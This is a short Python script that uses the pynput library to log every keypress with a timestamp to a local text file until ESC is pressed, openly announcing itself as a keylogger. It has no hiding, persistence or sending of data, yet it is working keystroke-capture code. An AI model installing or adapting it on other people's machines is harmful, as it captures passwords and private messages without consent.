import pynput
from pynput.keyboard import Key, Listener
import logging
import os

# Define the log directory and file
log_dir = r"D:\python\keylog.txt"  # Make sure this directory exists
os.makedirs(os.path.dirname(log_dir), exist_ok=True)

# Set up logging
logging.basicConfig(filename=log_dir, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key pressed: {key}')
    except Exception as e:
        logging.error(f'Error logging key: {e}')
    
    # Stop listener if ESC is pressed
    if key == Key.esc:
        return False  # Returning False stops the listener

# Create and start the key listener
with Listener(on_press=on_press) as listener:
    print("Keylogger is running... Press ESC to stop.")
    listener.join()  # Keep the listener running
